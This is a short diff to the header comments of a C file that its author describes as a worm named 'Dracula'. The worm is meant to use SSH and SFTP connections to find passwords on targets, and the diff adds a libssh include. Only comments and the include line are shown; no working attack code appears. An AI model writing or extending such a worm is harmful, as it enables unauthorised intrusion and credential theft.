@@ -1,6 +1,6 @@
 //Start Date: 24-09-2024
 //author - apocalypse9949(me)
-//description - WORM using sftp and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
+//description - WORM(Dracula) using sftp and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
 //WARNING!!
 //
 #include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
